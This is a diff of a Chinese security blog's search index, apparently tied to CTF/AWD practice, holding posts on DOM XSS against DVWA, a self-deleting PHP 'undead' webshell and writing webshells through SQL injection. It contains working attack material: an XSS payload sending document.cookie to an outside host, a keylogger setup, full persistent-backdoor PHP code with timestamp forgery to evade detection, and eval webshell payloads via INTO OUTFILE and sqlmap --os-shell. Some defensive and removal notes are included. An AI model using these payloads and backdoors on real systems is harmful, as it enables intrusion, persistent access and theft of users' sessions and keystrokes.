测试一下，注入payload，发现确实没有进行URL解码： 漏洞利用和之前写的《关于DOM型XSS漏洞的学习笔记》一样，将其重复整理到一起吧。 测试的level是low，其他level同理。 窃取cookie——createElement()利用JS的document.createElement()创建新标签如img并将cookie信息通过img标签src属性来请求发往目标主机，payload如下： /xss_d/?default=\var img=document.createElement(“img”);img.src=”http://127.0.0.1:8000/a?&quot;+escape(document.cookie);\ 篡改页面——innerHTML主要用于篡改页面，payload如下： /xss_d/?default=\document.body.innerHTML=”\\DOM XSS By SKI12\\“;\ 键盘记录——document.onkeypress利用document.onkeypress可实现键盘记录。 keylogger.js 放置于攻击者的服务器中，让目标服务器注入XSS后来访问执行。 keylogger.php 放置于攻击者的服务器中，用于接收目标服务器访问执行了keylogger.js后传送回来的用户输入的键盘信息，并保存在本地文件中。 payload： /xss_d/?default=\\ 此时用户在该Web界面输入的任何内容都会实时保存到keylog.txt中： 防御DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于： （1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现； （2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到\则进行JS编码。]]></content>
-      <categories>
-        <category>WriteUp:Web</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>XSS</tag>
+        <tag>安全开发</tag>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -882,8 +881,21 @@
         <category>Python</category>
       </categories>
       <tags>
-        <tag>Python</tag>
         <tag>Web安全</tag>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[PHP内存型木马]]></title>
+    <url>%2F2019%2F01%2F01%2FPHP%E5%86%85%E5%AD%98%E5%9E%8B%E6%9C%A8%E9%A9%AC%2F</url>
+    <content type="text"><![CDATA[基本概念PHP内存性木马即PHP不死马，一般会删除自身以进程的形式循环创建隐蔽的后门。 通常在AWD Web题中用得较多。 Demo及原理nodie.php 123456789101112&lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '/var/www/dvwa/.ski12.php'; $code = '&lt;?php if(md5($_POST["pass"])=="cdd7b7420654eb16c1e1b748d5b7c5b8")&#123;@system($_POST[a]);&#125;?&gt;'; while (1) &#123; file_put_contents($file, $code); system('touch -m -d "2018-12-01 09:10:12" .ski12.php'); usleep(5000); &#125;?&gt; 简单分析： ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。 set_time_limit()函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。 unlink(__FILE__)删除文件本身，以起到隐蔽自身的作用。 while循环内每隔usleep(5000)即写新的后门文件，中间system()执行的命令用于修改文件的创建或修改时间，可以绕过“find –name \’*.php\’ –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。 至于最后生成的隐蔽后门在需要校验一个POST参数的MD5值，原因在于防止其他人可以进行利用。 这里以DVWA为示例： 先找到上传点上传nodie.php： 访问文件所在路径让其执行，等待一会发现404，该文件不存在： 一般而言分两种情况，一种是乐观的、即文件执行成功且删除了自身、生成了隐蔽的后门；另一种是被干掉了。直接访问我们设置生成的隐蔽后门的路径检测一下是否真的生成了后门文件： 虽然没有返回，但确实存在该文件，接着直接利用即可： 以运维的视角尝试删除文件，发现删不掉： 查杀方法1、如果允许，重启服务是万能的； 2、其次，最好的解决方案是kill掉www-data用户的所有子进程： ps aux | grep www-data | awk ‘{print $2}’ | xargs kill -9 3、创建一个和不死马生成的马一样名字的目录； 4、编写一个使用ignore_user_abort(true)函数的脚本，一直竞争写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果。简单示例： 12345678&lt;?phpwhile (1) &#123; $pid = 不死马的进程PID; @unlink(".ski12.php"); exec("kill -9 $pid"); usleep(1000);&#125;?&gt;]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>AWD</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -898,15 +910,15 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Python安全小工具之反编译pyc文件]]></title>
-    <url>%2F2019%2F01%2F01%2FPython%E5%AE%89%E5%85%A8%E5%B0%8F%E5%B7%A5%E5%85%B7%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91pyc%E6%96%87%E4%BB%B6%2F</url>
-    <content type="text"><![CDATA[有时需要查看某个Python Web目录内Python源码，但dump下来只有pyc文件而没有py文件，这时需要我们反编译pyc文件为py文件。为了方便就写个脚本遍历目录内的pyc文件并进行反编译。 1234567891011121314151617181920212223242526272829303132#coding=utf-8import osimport sysimport uncompyle6def Decompile(path): if os.path.exists(path): for parent,dirs,files in os.walk(path): for file in files: file_name,ext = os.path.splitext(file) if ext == ".pyc": file_path = os.path.join(parent,file) print "[*]Decompiling:", file_path cmd = "uncompyle6 " + file_path + " &gt; " + parent + "\\" + file_name + ".py" try: os.system(cmd) print "[+]Decompile successful.\n" except Exception as e: print e print "[*]Finished." else: print "[-]Wrong Directory Path."def main(): if len(sys.argv) != 2: print "[*]Usage: python decompile.py [Directory Path]" else: path = sys.argv[1] Decompile(path)if __name__ == "__main__": main() 运行效果：]]></content>
+    <title><![CDATA[SQL注入写WebShell方式小结]]></title>
+    <url>%2F2019%2F01%2F01%2FSQL%E6%B3%A8%E5%85%A5%E5%86%99WebShell%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93%2F</url>
+    <content type="text"><![CDATA[这里小结一下通过SQL注入写入WebShell的方法。 通过SQL注入select into outfile实现，如： 1’ union select 1,’\&lt;?php eval($_POST[a]);?&gt;’ INTO OUTFILE ‘/var/www/tmp/nb.php’# 前提都是需要对目标目录具有写权限。 –os-cmd=”net user”交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径下创建文件返回结果，然后再自动删除。 ##–os-shell写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。注意:关闭sqlmap文件就会被删除。 ##本地写入webshell先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，–file-write “./mst/mst.txt” –file-dest “网站的绝对路径/1.php”。 注意需要最高权限。 MySQL写木马，通常可以通过phpmyadmin来实现。 前提条件：有读写的权限，有CREATE、INSERT、SELECT的权限。 1、创建一个表 CREATE TABLE a (cmd text NOT NULL); 2、插入数据 INSERT INTO a (cmd) VALUES(‘\&lt;?php eval($_POST[‘password’]);?&gt;’); 3、导出一句话 SELECT cmd from a into outfile ‘/var/www/tmp/webshell.php’; 4、删除表 Drop TABLE IF EXISTS a;]]></content>
       <categories>
-        <category>Python</category>
+        <category>Web安全基础</category>
       </categories>
       <tags>
-        <tag>安全开发</tag>
-        <tag>Python</tag>
+        <tag>Web安全</tag>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -940,8 +952,8 @@
         <category>Python</category>
       </categories>
       <tags>
-        <tag>Python</tag>
         <tag>Web安全</tag>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
